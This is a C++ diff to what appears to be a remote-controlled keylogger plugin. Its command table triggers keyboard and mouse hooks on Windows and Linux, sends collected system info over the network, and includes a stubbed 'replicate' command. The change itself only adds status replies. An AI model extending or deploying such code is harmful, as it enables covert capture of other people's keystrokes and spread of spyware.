@@ -30,7 +30,7 @@ SpiderPlugin::SpiderPlugin() : m_infos{}, m_keyboardHook(false), m_mouseHook(fal
     m_cmd["/getKeyboard"] = [this]() { getKeyboard(); };
     m_cmd["/getMouse"] = [this]() { getMouse(); };
     m_cmd["/kill"] = [this]() { kill(); };
-    m_cmd["/replicate"] = []() {};
+    m_cmd["/replicate"] = [this]() { replicate(); };
 }
 
 SpiderPlugin::~SpiderPlugin()
@@ -85,6 +85,7 @@ void SpiderPlugin::getInfos()
     msg.data.size = sizeof(m_infos);
     msg.data.raw = reinterpret_cast<std::uint8_t const *>(&m_infos);
     m_sendToNetwork->push(msg);
+    m_networkResponseQueue.push("OK\r\n");
 }
 
 bool SpiderPlugin::getKeyboard()
@@ -99,6 +100,7 @@ bool SpiderPlugin::getKeyboard()
 #elif defined __linux__
         m_keyboardHook = hookKeyboardLinux();
 #endif
+        m_networkResponseQueue.push((m_keyboardHook) ? "OK\r\n" : "KO\r\n");
     }
     else
     {
@@ -110,6 +112,7 @@ bool SpiderPlugin::getKeyboard()
 #elif defined __linux__
         m_keyboardHook = unHookKeyboardLinux();
 #endif
+        m_networkResponseQueue.push("OK\r\n");
     }
     return m_keyboardHook;
 }
@@ -126,6 +129,7 @@ bool SpiderPlugin::getMouse()
 #elif defined __linux__
         m_mouseHook = hookMouseLinux();
 #endif
+        m_networkResponseQueue.push((m_mouseHook) ? "OK\r\n" : "KO\r\n");
     }
     else
     {
@@ -137,6 +141,7 @@ bool SpiderPlugin::getMouse()
 #elif defined __linux__
         m_mouseHook = unHookMouseLinux();
 #endif
+        m_networkResponseQueue.push("OK\r\n");
     }
     return m_mouseHook;
 }
@@ -153,6 +158,11 @@ bool SpiderPlugin::kill()
 {
     m_networkResponseQueue.push("KO\r\n");
     return true;
+}
+
+void SpiderPlugin::replicate()
+{
+    m_networkResponseQueue.push("KO\r\n");
 }
 
 void SpiderPlugin::run()
